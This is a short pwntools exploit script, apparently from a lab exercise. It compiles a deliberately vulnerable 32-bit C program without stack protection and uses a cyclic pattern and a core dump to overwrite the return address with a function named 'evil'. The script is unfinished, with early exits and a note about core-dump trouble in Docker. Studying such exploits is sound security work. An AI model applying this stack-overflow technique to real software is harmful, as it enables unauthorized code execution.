#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *
import os

# os.system("gcc -m32 -fno-stack-protector -fno-pie overflow.c")
os.system("gcc -m32 -no-pie -fno-stack-protector overflow_b.c")

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './a.out'

# ===========================================================
# EXPLOIT GOES HERE
# ===========================================================

# Generate a cyclic pattern so that we can auto-find the offset
payload = cyclic(256)
print(payload)
exit()

# Run the process once so that it crashes
io = process(['./a.out', payload])

# Get the core dump
print("I ran into problems to generate corefile inside docker. hence, I manually executed the file in gdb with the paylaod created above and manually created the corefile from within gdb.")
exit()
core = Coredump('./core.278')

# Our cyclic pattern should have been used as the crashing address
assert pack(core.eip) in payload

# Cool! Now let's just replace that value with the address of 'evil'
crash = ELF('./a.out')

target_addr = crash.symbols.evil + \
    core.exe.address if crash.pie else crash.symbols.evil
payload = fit({
    cyclic_find(core.eip): target_addr
})
print("Address: ", hex(target_addr))

# payload = payload[:-2]+p32(core.eip)[:2]
# Get a shell!
print(payload)
io = process(['./a.out'])
io.sendline(payload)
io.wait()
print(io.recvline())
print(io.recvline())
# uid=1000(user) gid=1000(user) groups=1000(user)
